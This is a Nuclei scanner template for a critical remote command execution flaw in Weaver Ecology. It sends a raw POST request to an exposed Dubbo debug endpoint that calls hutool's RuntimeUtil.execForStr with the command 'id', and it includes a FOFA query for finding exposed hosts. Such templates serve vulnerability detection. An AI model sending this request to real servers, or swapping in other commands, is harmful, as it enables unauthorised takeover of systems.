id: ecology-execforstr-rce

info:
  name: Weaver Ecology ExecForStr 远程命令执行
  author: DhiyaneshDk
  severity: critical
  description: |-
    Weaver Ecology 暴露了一个调试 API 端点，可调用 `cn.hutool.core.util.RuntimeUtil.execForStr`，导致远程命令执行。成功利用后，攻击者可在目标服务器上执行任意操作系统命令。
  metadata:
    verified: true
    vendor: weaver
    product: ecology
    max-request: 1
    fofa-query: body="/build/ecodesdk/static/js/lib.js"
  tags: weaver,ecology,rce,dubbo,hutool

http:
  - raw:
      - |
        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        [["id"]]

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'uid=([0-9(a-z) ]+)gid=([0-9(a-z) ]+)'

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - '((u|g)id|groups)=[^\r\n"]+'
# digest: 4b0a00483046022100ae84bf202ab541e2624a0ff225dc26aeb014d8b6f3ebea5fd02cb94c895ebdf002210087f8d4de19811ce3553762bb635533aa4eed7104d2980eb0e4af32f4cf2fa07e:922c64590222798bb761d5b6d8e72950
